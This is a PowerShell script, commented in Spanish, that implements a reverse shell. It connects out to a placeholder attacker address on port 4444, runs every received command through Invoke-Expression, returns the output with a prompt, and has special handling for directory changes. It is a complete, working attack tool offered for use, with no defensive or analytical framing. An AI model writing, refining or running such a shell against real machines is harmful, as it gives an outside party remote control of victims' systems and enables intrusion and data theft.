# Reverse Shell con manejo CORRECTO del directorio de trabajo
$client = New-Object System.Net.Sockets.TcpClient('TU_IP', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Inicializar el directorio de trabajo
$currentLocation = Get-Location

# Función para ejecutar comandos y manejar 'cd' especialmente
function Execute-Command {
    param([string]$Command)
    
    # Manejar el comando 'cd' de forma especial
    if ($Command.Trim().ToLower().StartsWith('cd ')) {
        $path = $Command.Trim().Substring(3).Trim()
        try {
            if ($path -eq '..') {
                Set-Location ..
            } elseif ($path -eq '/') {
                Set-Location \
            } elseif ($path -match '^[a-zA-Z]:') {
                Set-Location $path
            } else {
                # Ruta relativa
                Set-Location (Join-Path $currentLocation $path)
            }
            $currentLocation = Get-Location
            return "Directorio cambiado a: $currentLocation`r`n"
        } catch {
            return "ERROR: No se pudo cambiar al directorio. $($_.Exception.Message)`r`n"
        }
    } else {
        # Para otros comandos, cambiar al directorio actual primero
        Set-Location $currentLocation
        
        # Ejecutar el comando
        try {
            $output = Invoke-Expression $Command 2>&1 | Out-String
            return $output
        } catch {
            return "ERROR: $($_.Exception.Message)`r`n"
        }
    }
}

# Enviar prompt inicial
$writer.Write("PS $currentLocation> ")

# Bucle principal
while($client.Connected) {
    try {
        if ($stream.DataAvailable) {
            $command = $reader.ReadLine()
            
            if ($command -eq 'exit') {
                break
            }
            
            # Ejecutar comando y obtener resultado
            $result = Execute-Command $command
            
            # Actualizar ubicación después de cada comando
            $currentLocation = Get-Location
            
            # Enviar resultado + nuevo prompt
            $writer.Write($result)
            $writer.Write("PS $currentLocation> ")
        }
        Start-Sleep -Milliseconds 100
    } catch {
        # Silenciar errores de conexión
        break
    }
}

# Limpiar
$reader.Close()
$writer.Close()
$client.Close()
